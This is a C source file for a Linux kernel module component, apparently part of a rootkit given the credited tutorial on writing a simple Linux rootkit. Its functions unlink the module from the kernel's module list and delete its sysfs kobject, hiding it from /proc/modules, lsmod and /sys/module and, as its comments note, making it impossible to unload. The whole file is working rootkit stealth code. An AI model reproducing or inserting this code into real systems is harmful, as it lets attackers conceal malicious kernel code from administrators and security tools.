#include <linux/module.h>   // For modules
#include <linux/kernel.h>   // For KERN_INFO
#include <linux/init.h>     // For init macros

#include "moduleHide.h"

// Credit goes to:
// http://www.infosecwriters.com/hhworld/hh9/lvtes.txt - explanation of concept
// http://alexids.googlecode.com/files/WRITING_A_SIMPLE_ROOTKIT_FOR_LINUX.pdf - code
// http://isis.poly.edu/kulesh/stuff/src/klist/ - kernel lists explained

static struct list_head *prev;	// The entry before our module in the kernel modules list
static bool started = false;


int moduleHide_start(void) {
	if (started) return 0;
	started = true;

	// Removes module structure from kernel module list structure, which in turn hides it from 
	// /proc/modules and lsmod.
	// While it is absent form the list, the module can't be uninstalled anymore.
	prev = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	// Hide from /sys/module
	kobject_del(&THIS_MODULE->mkobj.kobj);
	list_del(&THIS_MODULE->mkobj.kobj.entry);


	return 0;
}

// TODO: Add the kobject back too
void moduleHide_stop(void) {
	if (!started) return;
	started = false;

	list_add(&THIS_MODULE->list, prev);
	// entires in /sys/module are not restored
}


